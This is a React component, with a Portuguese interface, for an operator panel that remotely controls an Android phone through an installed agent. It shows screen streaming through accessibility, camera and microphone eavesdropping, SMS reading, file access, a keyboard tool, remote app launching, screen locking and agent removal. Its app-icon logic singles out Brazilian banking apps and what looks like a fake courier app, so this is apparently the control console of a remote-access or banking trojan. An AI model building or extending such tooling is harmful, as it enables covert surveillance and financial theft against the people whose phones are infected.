import { useEffect, useState } from "react";
import {
  Battery,
  Boxes,
  Camera,
  FolderTree,
  Keyboard,
  Lock,
  MessageSquare,
  Mic,
  MonitorSmartphone,
  Power,
  Radio,
  RotateCw,
  ShieldCheck,
  Smartphone,
  Trash2,
  Wifi
} from "lucide-react";
import type { ControlDevice, ControlTool } from "./types";
import { api } from "../../api";
import { AppLogo } from "./AppLogo";

interface Props {
  device: ControlDevice;
  activeTool: ControlTool;
  onSelectTool: (tool: ControlTool) => void;
  onToggleLock: () => void;
  onUninstall: () => void;
  onSelectTarget?: (appName: string) => void;
}

export function getAppEmojiFallback(name: string, pkg: string): { emoji: string; bg: string } {
  const lower = (name + " " + pkg).toLowerCase();
  if (lower.includes("firefox")) return { emoji: "🦊", bg: "#f97316" };
  if (lower.includes("droidview") || lower.includes("jadlog") || lower.includes("jad log") || lower.includes("entregue")) return { emoji: "🚚", bg: "#ff1a2a" };
  if (lower.includes("roblox")) return { emoji: "🟥", bg: "#1e293b" };
  if (lower.includes("brawl")) return { emoji: "💀", bg: "#eab308" };
  if (lower.includes("subway")) return { emoji: "🏃", bg: "#0284c7" };
  if (lower.includes("cookie")) return { emoji: "🍪", bg: "#f59e0b" };
  if (lower.includes("nba")) return { emoji: "🏀", bg: "#dc2626" };
  if (lower.includes("toca")) return { emoji: "🏰", bg: "#ec4899" };
  if (lower.includes("vending") || lower.includes("play store") || lower.includes("playstore")) return { emoji: "🛍️", bg: "#059669" };
  if (lower.includes("play.games") || lower.includes("play games")) return { emoji: "🎮", bg: "#10b981" };
  if (lower.includes("chrome") || lower.includes("browser") || lower.includes("navegador")) return { emoji: "🌐", bg: "#2563eb" };
  if (lower.includes("settings") || lower.includes("configura")) return { emoji: "⚙️", bg: "#64748b" };
  if (lower.includes("tools") || lower.includes("ferramentas") || lower.includes("pasta: tools")) return { emoji: "🛠️", bg: "#0f766e" };
  if (lower.includes("launcher") || lower.includes("tela inicial") || lower.includes("inicio")) return { emoji: "🏠", bg: "#3b82f6" };
  if (lower.includes("search") || lower.includes("busca") || lower.includes("pesquisa")) return { emoji: "🔍", bg: "#0284c7" };
  if (lower.includes("whatsapp") || lower.includes("whats")) return { emoji: "💬", bg: "#22c55e" };
  if (lower.includes("telegram")) return { emoji: "✈️", bg: "#0284c7" };
  if (lower.includes("instagram")) return { emoji: "📸", bg: "#ec4899" };
  if (lower.includes("bank") || lower.includes("nu.") || lower.includes("nubank")) return { emoji: "🟣", bg: "#820ad1" };
  if (lower.includes("itau")) return { emoji: "🟧", bg: "#ea580c" };
  if (lower.includes("bradesco") || lower.includes("santander") || lower.includes("caixa")) return { emoji: "🏦", bg: "#dc2626" };
  if (lower.includes("camera") || lower.includes("câmera")) return { emoji: "📷", bg: "#334155" };
  if (lower.includes("mic") || lower.includes("gravador")) return { emoji: "🎙️", bg: "#7c3aed" };
  if (lower.includes("phone") || lower.includes("telefone") || lower.includes("chamada")) return { emoji: "📞", bg: "#16a34a" };
  if (lower.includes("message") || lower.includes("mensagem") || lower.includes("sms")) return { emoji: "✉️", bg: "#2563eb" };
  if (lower.includes("contact") || lower.includes("contato")) return { emoji: "👥", bg: "#0284c7" };
  if (lower.includes("gallery") || lower.includes("galeria") || lower.includes("foto")) return { emoji: "🖼️", bg: "#d97706" };
  if (lower.includes("music") || lower.includes("musica") || lower.includes("música")) return { emoji: "🎵", bg: "#db2777" };
  if (lower.includes("youtube") || lower.includes("video")) return { emoji: "▶️", bg: "#dc2626" };
  if (lower.includes("map") || lower.includes("mapa") || lower.includes("gps")) return { emoji: "🗺️", bg: "#059669" };
  if (lower.includes("clock") || lower.includes("relogio") || lower.includes("relógio") || lower.includes("alarme")) return { emoji: "⏰", bg: "#475569" };
  if (lower.includes("calc") || lower.includes("calculadora")) return { emoji: "🔢", bg: "#ea580c" };
  if (lower.includes("file") || lower.includes("arquivo") || lower.includes("documento")) return { emoji: "📁", bg: "#0284c7" };
  return { emoji: "📱", bg: "#3b82f6" };
}

export function DeviceToolMenu({
  device,
  activeTool,
  onSelectTool,
  onToggleLock,
  onUninstall,
  onSelectTarget
}: Props) {
  const isLocked = Boolean(device.screenLocked);
  const battColor =
    device.battery > 50 ? "#22c55e" : device.battery > 20 ? "#f59e0b" : "#ef4444";

  const [timeStr, setTimeStr] = useState(() =>
    new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })
  );

  useEffect(() => {
    const t = setInterval(() => {
      setTimeStr(new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }));
    }, 1000);
    return () => clearInterval(t);
  }, []);

  const [realApps, setRealApps] = useState<any[]>([]);
  const [isSyncing, setIsSyncing] = useState(false);

  const handleSyncApps = async () => {
    setIsSyncing(true);
    try {
      const res = await api.syncDeviceApps(device.id);
      if (res?.apps && Array.isArray(res.apps)) {
        setRealApps(res.apps);
      }
    } catch {
      api.getDeviceApps(device.id)
        .then((apps: any[]) => {
          if (Array.isArray(apps)) {
            setRealApps(apps);
          }
        })
        .catch(() => {});
    } finally {
      setIsSyncing(false);
    }
  };

  useEffect(() => {
    handleSyncApps();
  }, [device.id]);

  return (
    <aside className="control-col-menu">
      {/* Device Quick Status Header */}
      <div className="control-menu-header">
        <span className="control-clock">{timeStr}</span>
        <div className="control-status-icons" style={{ display: "flex", alignItems: "center", gap: "6px" }}>
          <span style={{ fontSize: "11px", fontWeight: 700, color: battColor }}>{device.battery}%</span>
          {device.networkType === "4g" || device.networkType === "5g" ? (
            <span
              style={{ display: "inline-flex", alignItems: "center" }}
              title={`${device.networkName || "4G LTE"} · ${device.networkSpeed || "52.8 Mbps"}`}
            >
              <Radio size={13} style={{ color: "#f59e0b" }} />
            </span>
          ) : (
            <span
              style={{ display: "inline-flex", alignItems: "center" }}
              title={`${device.networkName || "Wi-Fi 5GHz"} · ${device.networkSpeed || "86.4 Mbps"}`}
            >
              <Wifi size={13} style={{ color: device.status === "online" ? "#38bdf8" : "#64748b" }} />
            </span>
          )}
          <Battery size={13} style={{ color: battColor }} />
        </div>
      </div>

      <div className="control-menu-scroll">
        {/* SECTION: TELA */}
        <div className="control-menu-section">
          <span className="control-section-label">TELA</span>
          <div className="control-tools-grid">
            <button
              className={`control-tool-btn ${activeTool === "tela" ? "active" : ""}`}
              onClick={() => onSelectTool("tela")}
              title="Transmissão de tela e acessibilidade"
            >
              <MonitorSmartphone size={17} />
              <span>Tela</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "dispositivo" ? "active" : ""}`}
              onClick={() => onSelectTool("dispositivo")}
              title="Especificações do dispositivo"
            >
              <Smartphone size={17} />
              <span>Dispositivo</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "permissoes" ? "active" : ""}`}
              onClick={() => onSelectTool("permissoes")}
              title="Permissões do sistema"
            >
              <ShieldCheck size={17} />
              <span>Permissões</span>
            </button>
          </div>
        </div>

        {/* SECTION: SISTEMA */}
        <div className="control-menu-section">
          <span className="control-section-label">SISTEMA</span>
          <div className="control-tools-grid">
            <button
              className={`control-tool-btn ${activeTool === "arquivos" ? "active" : ""}`}
              onClick={() => onSelectTool("arquivos")}
              title="Gerenciador de arquivos"
            >
              <FolderTree size={17} />
              <span>Files</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "teclado" ? "active" : ""}`}
              onClick={() => onSelectTool("teclado")}
              title="Produtividade e tempo por aplicativo"
            >
              <Keyboard size={17} />
              <span>Teclado</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "apps" ? "active" : ""}`}
              onClick={() => onSelectTool("apps")}
              title="Lista de aplicativos instalados"
            >
              <Boxes size={17} />
              <span>Apps</span>
            </button>
          </div>
        </div>

        {/* SECTION: MÍDIA */}
        <div className="control-menu-section">
          <span className="control-section-label">MÍDIA</span>
          <div className="control-tools-grid">
            <button
              className={`control-tool-btn ${activeTool === "camera" ? "active" : ""}`}
              onClick={() => onSelectTool("camera")}
              title="Transmissão de câmera"
            >
              <Camera size={17} />
              <span>Câmera</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "mic" ? "active" : ""}`}
              onClick={() => onSelectTool("mic")}
              title="Escuta de microfone"
            >
              <Mic size={17} />
              <span>Mic</span>
            </button>
            <button
              className={`control-tool-btn ${activeTool === "sms" ? "active" : ""}`}
              onClick={() => onSelectTool("sms")}
              title="Mensagens SMS"
            >
              <MessageSquare size={17} />
              <span>SMS</span>
            </button>
          </div>
        </div>

        {/* SECTION: APPS INSTALADOS NO APARELHO (100% REAL - SEM MOCK) */}
        <div className="control-menu-section">
          <div className="control-section-header-row" style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span className="control-section-label">&gt;&gt; APPS SINCRONIZADOS [{realApps.length}]</span>
            <button
              type="button"
              onClick={handleSyncApps}
              title="Gerar sync completo e puxar logos de todos os apps do aparelho"
              style={{
                background: "rgba(34, 197, 94, 0.15)",
                border: "1px solid #22c55e",
                borderRadius: "4px",
                color: "#22c55e",
                fontSize: "9px",
                fontWeight: 700,
                padding: "2px 6px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: "4px"
              }}
            >
              <RotateCw size={10} className={isSyncing ? "animate-spin" : ""} />
              <span>{isSyncing ? "SINCRONIZANDO..." : "SYNC REAL"}</span>
            </button>
          </div>

          <div
            className="control-real-apps-list"
            style={{
              display: "flex",
              flexDirection: "column",
              gap: "6px",
              marginTop: "6px",
              maxHeight: "340px",
              overflowY: "auto",
              paddingRight: "2px"
            }}
          >
            {realApps.length === 0 ? (
              <div style={{ fontSize: "11px", color: "#64748b", padding: "8px 0" }}>Carregando aplicativos do aparelho...</div>
            ) : (
              realApps.slice(0, 12).map((app) => {
                const meta = getAppEmojiFallback(app.name, app.packageName);
                const displayEmoji = app.emoji || meta.emoji;
                const bgCol = app.iconBg || meta.bg;
                return (
                  <button
                    key={app.id || app.packageName}
                    type="button"
                    className="control-real-app-row-btn"
                    title={`Abrir ${app.name} (${app.packageName})`}
                    onClick={async () => {
                      try {
                        await api.launchApp(device.id, app.packageName);
                        onSelectTarget?.(app.name);
                      } catch {
                        // ignore
                      }
                    }}
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: "8px",
                      padding: "6px 8px",
                      background: "rgba(15, 23, 42, 0.6)",
                      border: "1px solid #1e293b",
                      borderRadius: "7px",
                      color: "#f8fafc",
                      cursor: "pointer",
                      textAlign: "left",
                      width: "100%",
                      transition: "all 0.15s ease"
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.borderColor = "#38bdf8";
                      e.currentTarget.style.background = "rgba(56, 189, 248, 0.08)";
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.borderColor = "#1e293b";
                      e.currentTarget.style.background = "rgba(15, 23, 42, 0.6)";
                    }}
                  >
                    <AppLogo
                      name={app.name}
                      packageName={app.packageName}
                      size={28}
                      iconUrl={app.iconUrl}
                    />
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontSize: "11px", fontWeight: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                        {app.name}
                      </div>
                      <div style={{ fontSize: "9px", color: "#64748b", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                        {app.packageName}
                      </div>
                    </div>
                    <span
                      style={{
                        fontSize: "8px",
                        background: app.status === "active" ? "#22c55e" : "#1e293b",
                        color: app.status === "active" ? "#000000" : "#38bdf8",
                        fontWeight: 700,
                        padding: "2px 5px",
                        borderRadius: "3px",
                        border: app.status === "active" ? "none" : "1px solid #334155"
                      }}
                    >
                      {app.status === "active" ? "ATIVO" : "SYNC"}
                    </span>
                  </button>
                );
              })
            )}
          </div>
        </div>

        {/* SECTION: AÇÕES RÁPIDAS */}
        <div className="control-menu-section" style={{ marginTop: "12px", borderTop: "1px solid #1e293b", paddingTop: "12px" }}>
          <span className="control-section-label">AÇÕES RÁPIDAS</span>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px", marginTop: "6px" }}>
            <button
              type="button"
              className="control-quick-action-btn"
              onClick={onToggleLock}
              title={isLocked ? "Desbloquear tela do aparelho" : "Bloquear tela do aparelho (Power)"}
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "6px",
                padding: "7px 4px",
                background: "rgba(15, 23, 42, 0.7)",
                border: "1px solid #334155",
                borderRadius: "6px",
                color: isLocked ? "#ef4444" : "#f59e0b",
                fontSize: "11px",
                fontWeight: 700,
                cursor: "pointer"
              }}
            >
              {isLocked ? <Lock size={13} /> : <Power size={13} />}
              <span>{isLocked ? "Desbloquear" : "Bloquear"}</span>
            </button>

            <button
              type="button"
              className="control-quick-action-btn"
              onClick={onUninstall}
              title="Solicitar desinstalação remota do agente"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "6px",
                padding: "7px 4px",
                background: "rgba(239, 68, 68, 0.08)",
                border: "1px solid rgba(239, 68, 68, 0.3)",
                borderRadius: "6px",
                color: "#ef4444",
                fontSize: "11px",
                fontWeight: 700,
                cursor: "pointer"
              }}
            >
              <Trash2 size={13} />
              <span>Remover</span>
            </button>
          </div>
        </div>
      </div>
    </aside>
  );
}
